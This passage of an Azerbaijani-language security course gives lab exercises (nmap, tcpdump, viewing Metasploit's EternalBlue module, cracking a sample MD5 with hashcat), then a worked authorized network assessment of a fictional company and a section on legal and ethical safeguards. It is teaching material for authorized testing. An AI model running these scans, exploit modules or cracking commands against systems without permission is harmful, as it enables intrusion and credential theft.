`scanme.nmap.org` Nmap-ın məhz bu məqsədlə saxladığı icazəli hədəfdir. Çıxışı oxu: Hansı portlar açıqdır? Hansı versiyalar? Default NSE skriptləri nə tapdı? Bu real engagement olsaydı daha çox araşdıracağınız ən azı bir tapıntı müəyyən et.

### 2. Öz DNS trafikinin 30 saniyəsini tut

Kali VM-də aktiv interfeysini tap (`ip a`), sonra:

```bash
sudo timeout 30 tcpdump -i eth0 -w dns.pcap 'port 53'
```

İşləyərkən bir az DNS yarat (brauzer aç, beş sayta gir). Faylı Wireshark-da aç (`wireshark dns.pcap`), `dns` filterini tətbiq et və cavab ver:

- Hansı sorğular getdi? Hansılarına cavab verildi?
- DNS adi UDP/53-də idi, yoxsa DoH/DoT-da?
- Ən yavaş cavab nə qədər çəkdi?

### 3. Metasploit-i yüklə, MS17-010-a bax

```bash
msfconsole -q
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info
```

Bütün `info` səhifəsini oxu. Tələb olunan opsiyaları (`RHOSTS`, `LHOST`, `PAYLOAD`), təsirlənmiş platformaları, açıqlama tarixini və istinadları müəyyən et. Onu işlətmirsən — modul səhifəsini oxumağı öyrənirsən.

### 4. hashcat ilə nümunə MD5 hash-i qır

`Password1`-in MD5-i `2ac9cb7dc02b3c0083eb70898e549b63`-dir. Saxla:

```bash
echo "2ac9cb7dc02b3c0083eb70898e549b63" > sample.hash
hashcat -m 0 -a 0 sample.hash /usr/share/wordlists/rockyou.txt
hashcat -m 0 sample.hash --show
```

Saniyədə hash dərəcəsini qeyd et. Sonra eyni hash-i `hashcat -m 0 -a 3 sample.hash ?u?l?l?l?l?l?l?d` (8-simvollu qarışıq maska) ilə sına və işləmə müddətini müqayisə et. Dərs odur ki, şifrə siyahıdadırsa, wordlist brute-force-u nə qədər kəskin şəkildə üstələyir.

## İşlənmiş nümunə — example.local həftəsonu skanı

Siz example.local-da IT təhlükəsizlik mühəndisisiniz — 200-işçilik proqram firması. Cümə günü günortadan sonra CTO-dan həftəsonu boyu ofis subnet-i `10.10.0.0/24`-ün şəbəkə miqyaslı qiymətləndirməsini həyata keçirmək üçün yazılı icazə alırsınız. Blue-team SIEM analitiki növbədədir və skan pəncərənizi bilir. Aşağıda işləyən mühəndisin izlədiyi cadence var.

**Cümə 18:00 — Kəşfiyyat (~15 dəq).** Test laptopundan ofis VLAN-da:

```bash
sudo arp-scan -I eth0 10.10.0.0/24 | tee discovery.txt
sudo nmap -sn 10.10.0.0/24 -oG nmap-alive.gnmap
```

İki çıxışı kross-istinad et. `arp-scan` xətti ICMP-bloklanan cihazları tutur. ~150 canlı host ilə bitirməlisiniz (evdə yatan iş stansiyaları özlərini sayır).

**Cümə 19:00 — Xidmət siyahıya alma (~2 saat).** Canlı siyahını daha dərin skan-a ötür:

```bash
awk '/Up/ {print $2}' nmap-alive.gnmap > alive.txt
sudo nmap -sV -sC -T4 -p- -iL alive.txt -oA full-scan
```

Bu tamamlandıqda subnet-də hər açıq port və xidmət versiyasının XML, grep və insan-oxuna bilən qeydiniz var. Tapıntıları anomaliyaya görə sırala: port 22 açıq printer, masaüstü VLAN-da idarə olunmayan Linux server, auditorun ötən rüb inventarında qaçırdığı köhnə Windows 7 maşın.

**Şənbə 09:00 — Authenticated zəiflik skanı (~4 saat).** Eyni hədəf siyahısına qarşı Nessus-u (və ya OpenVAS-ı) işə sal, bu dəfə IT menecerinin təmin etdiyi *Domain Admins* read-only hesabı ilə. Authenticated skanlar yavaşdır — qəhvədən əvvəl başlat. Hesabatı CVSS plus biznes konteksti istifadə edərək Critical / High / Medium / Low-a triaj et (reytinq metodu üçün [Təşkilati Təhlükəsizlik Qiymətləndirməsi](./security-assessment.md)-nə baxın).

**Şənbə 14:00 — Bir anomaliyanı paket tutma ilə araşdır.** Nessus hesabatı `10.10.0.87` iş stansiyasının biznes etmədiyiniz ölkəyə outbound bağlantılar etdiyini qeyd edir. Ofis gateway-ində `tcpdump` park et:

```bash
sudo tcpdump -i eth0 -w susp.pcap 'host 10.10.0.87'
```

Bir saat gözlə. Wireshark-da aç, `ip.dst == <şübhəli-IP>` filtrlə, TCP axınını izlə. Məlum olur ki, bu, həmin ölkədəki CDN-dən avto-yenilənən developer-in IDE plugin-idir — false alarm, lakin sənədləşdirilmişdir.

**Bazar 11:00 — Yekunlaşdırma.** Tapıntıları kompilyasiya et, sübutu screenshot et, hesabatı qara (şablon [security-assessment](./security-assessment.md) dərsində yaşayır) və SIEM analitikinə skan pəncərəsinin bağlandığını bildir. Bazar ertəsinin standup-ı icraçı xülasəni alır; texniki tapıntılar ticket-i platforma komandasına ciddiliklə SLA-larla gedir.

Bu ardıcıllıq — kəşf et, siyahıya al, skanla, qəribə şeyi araşdır, sənədləşdir, ötür — istər example.local-da, istərsə də Fortune 500-də olun, eynidir. Yalnız miqyas və ətrafdakı tooling dəyişir.

## Hüquqi və etik qoruyucular

İcazəsiz skanlama əksər yurisdiksiyalarda cinayətdir (ABŞ Computer Fraud and Abuse Act, BB Computer Misuse Act, Cybercrime Convention altında AB milli ekvivalentləri). Hətta icazəli skanlama da bir şeyləri qıra bilər, istəmədiyiniz xəbərdarlıqlar yarada bilər və səhlənkar edildikdə karyeraları sona çatdıra bilər. Müzakirə edilməyənlər:

- **Yalnız icazəli olduğunuz şeyi skanlayın.** Yazılı, tarixli, əhatə dairəsi olan — "IT meneceri qəhvə zamanı OK dedi" yox. İcazə məktubunu göstərə bilmirsinizsə, skanlamayın.
- **Əhatə dairəsini dəqiq müəyyən edin.** IP aralıqları, hostname-lər, vaxt pəncərələri, icazə verilən texnikalar (DoS yoxdur, açıq sadalanmadıqca sosial mühəndislik yoxdur), istisnalar (production ödəniş prosessoru, icraçı endpoint-lər).
- **Partlayış radiusunu idarə edin.** Aşağı vaxt rejimi (`-T2`/`-T3`), kiçik konkurrentlik və məlum-təhlükəsiz skan profilləri ilə başlayın. Yalnız icazə ilə eskalasiya edin.
- **Blue-team-ə bildirin.** Onlar testi kimin işlətdiyini, nə vaxt, hansı IP-dən və sizə necə çatacaqlarını bilməlidirlər. Əks halda onu real hücum kimi qəbul edirlər — ki, daxili məşqlərin məqsədi budur, lakin qəsdli olmalıdır.
- **Tapıntıları məxfi məlumat kimi idarə edin.** Pen-test hesabatı şirkəti təhlükə altına almaq üçün yol xəritəsidir. Bunu istirahətdə şifrələyin, yalnız təsdiqlənmiş kanallar vasitəsilə e-poçtla göndərin, paylaşılmış disk-də yox, engagement platformasında saxlayın.
- **Bir şey qırılanda dayanın.** Qeyd edin, bildirin, "sadəcə davam edək, sonra düzəldərik" deməyin. Aqressiv UDP skanı səbəbindən çökmüş ürək monitorinqi serveri tooling problemi deyil; bu insan problemidir.
- **Onların razılığı olmadan üçüncü tərəf SaaS-a qarşı vendor skanerləri yoxdur.** Microsoft 365 və ya AWS endpoint-lərini onların pen-test proqramından keçmədən skanlamaq müqavilə pozuntusudur.

Müəyyən bir hərəkətin əhatə dairəsində olub-olmadığına əmin deyilsinizsə, etməzdən əvvəl soruşun. Auditorlar və hüquqşünaslar cavabın texniki saflığından çox sualın verilməsinə əhəmiyyət verirlər.

## Əsas nəticələr

- Alətlər asan hissədir — hansı alətin hansı problemə uyğun olduğunu bilmək bacarıqdır.
- Kəşfiyyat (`nmap`, `arp-scan`, `masscan`) və paket analizi (`Wireshark`, `tcpdump`) iki universal qabiliyyətdir; əvvəlcə onları qurun.
- Authenticated, agent əsaslı zəiflik skanlanması yalnız şəbəkə skanlarından kəskin şəkildə daha çox tapır — credentials-ı qabaqcadan qurun.
- Veb proqram ilk-passı hər dəfə eyni beş addımdır: müəyyən et, crawl et, süpür, manual proksi, hədəflənmiş injection.
- Metasploit səlis oxumalı olduğunuz freymvorkdur; əsl exploit nadir hallarda maraqlıdır — post-exploitation modulları maraqlıdır.
- Cracker-lər (`hashcat`, `John`) müdafiəçinin alət dəstinə də aiddir, şifrə-gücü testi və insident triajı üçün.
- OSINT skanlamadan əvvəl gəlir — hücumçunun artıq nə görə biləcəyini öyrən, sonra ətrafında plan qur.
- Forensic alətlər ən çox *sıraya* əhəmiyyət verir: əvvəlcə imic, imici analiz et; bir dəfə kompromat şübhəsi olduqda canlı sistemə heç vaxt etibar etmə.
- NIST SP 800-88 (Clear / Purge / Destroy) utilizasiya standartıdır; SSD-lər DBAN deyil, kriptoqrafik silmə və ya fiziki məhv tələb edir.
- İcazə, əhatə dairəsi və partlayış radiusu nəzarəti sənəd işi deyil — onlar təhlükəsizlik mühəndisini cinayətkardan ayıran şeydir.

## İstinadlar

- Nmap istinad təlimatı və NSE skriptləri — `https://nmap.org/book/man.html`
- Nessus / Tenable sənədləri — `https://docs.tenable.com/`
- OpenVAS / Greenbone Community Edition — `https://greenbone.github.io/docs/`
- PortSwigger Web Security Academy (pulsuz, dünya səviyyəli veb test kurikulumu) — `https://portswigger.net/web-security`
- OWASP Web Security Testing Guide (WSTG) — `https://owasp.org/www-project-web-security-testing-guide/`
- Metasploit Unleashed (pulsuz MSF kursu) — `https://www.offsec.com/metasploit-unleashed/`
- hashcat wiki — `https://hashcat.net/wiki/`
- Volatility 3 sənədləri — `https://volatility3.readthedocs.io/`
- Sysinternals utilitləri — `https://learn.microsoft.com/en-us/sysinternals/`
- Kali Linux alət indeksi — `https://www.kali.org/tools/`
- NIST SP 800-88 Rev. 1 — Media Sanitization Təlimatları — `https://csrc.nist.gov/publications/detail/sp/800-88/rev-1/final`
- SANS GIAC alət istinadı (pulsuz ağ kitablar) — `https://www.sans.org/white-papers/`
- aircrack-ng sənədləri — `https://www.aircrack-ng.org/documentation.html`
- Shodan və Censys — `https://www.shodan.io/` , `https://censys.io/`
- Certificate Transparency axtarışı — `https://crt.sh/`
